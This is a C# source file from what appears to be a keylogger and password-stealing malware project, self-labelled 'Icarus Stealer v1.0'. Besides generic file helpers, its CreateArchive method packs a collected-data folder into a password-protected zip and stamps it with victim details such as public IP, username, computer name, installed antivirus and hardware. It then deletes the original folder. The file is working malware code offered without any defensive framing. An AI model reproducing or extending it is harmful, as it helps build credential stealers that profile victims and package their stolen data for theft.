﻿using Ionic.Zip;
using Ionic.Zlib;
using System.IO;
using System.Linq;
using System.Text;

namespace Keylogger
{
    internal sealed class Filemanager
    {
        // Remove directory
        public static void RecursiveDelete(string path)
        {
            var baseDir = new DirectoryInfo(path);

            if (!baseDir.Exists) return;
            foreach (var dir in baseDir.GetDirectories())
                RecursiveDelete(dir.FullName);

            baseDir.Delete(true);
        }

        // Copy directory
        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            var files = Directory.GetFiles(sourceFolder);
            foreach (var file in files)
            {
                var name = Path.GetFileName(file);
                var dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }

            var folders = Directory.GetDirectories(sourceFolder);
            foreach (var folder in folders)
            {
                var name = Path.GetFileName(folder);
                var dest = Path.Combine(destFolder, name);
                CopyDirectory(folder, dest);
            }
        }

        // Get directory size
        public static long DirectorySize(string path)
        {
            var dir = new DirectoryInfo(path);
            return dir.GetFiles().Sum(fi => fi.Length) +
                   dir.GetDirectories().Sum(di => DirectorySize(di.FullName));
        }

        // Create archive
        public static string CreateArchive(string directory, bool setpassword = true)
        {
            if (Directory.Exists(directory))
                using (var zip = new ZipFile(Encoding.UTF8))
                {
                    zip.CompressionLevel = CompressionLevel.BestCompression;
                    zip.Comment = "" +
                                  $"\nIcarus Stealer v1.0 - Passwords stealer coded by Icarus Development" +
                                  "\n" +
                                  "\n== System Info ==" +
                                  "\nIP: " + SystemInfo.GetPublicIp() +
                                  "\nDate: " + SystemInfo.Datenow +
                                  "\nUsername: " + SystemInfo.Username +
                                  "\nCompName: " + SystemInfo.Compname +
                                  "\nLanguage: " + SystemInfo.Culture +
                                  "\nAntivirus: " + SystemInfo.GetAntivirus() +
                                  "\n" +
                                  "\n== Hardware ==" +
                                  "\nCPU: " + SystemInfo.GetCpuName() +
                                  "\nGPU: " + SystemInfo.GetGpuName() +
                                  "\nRAM: " + SystemInfo.GetRamAmount() +
                                  "\nPower: " + SystemInfo.GetBattery() +
                                  "\nScreen: " + SystemInfo.ScreenMetrics() +
                                  "\n";
                    if (setpassword)
                        zip.Password = StringsCrypt.ArchivePassword;
                    zip.AddDirectory(directory);
                    zip.Save(directory + ".zip");
                }

            RecursiveDelete(directory);
            return directory + ".zip";
        }
    }
}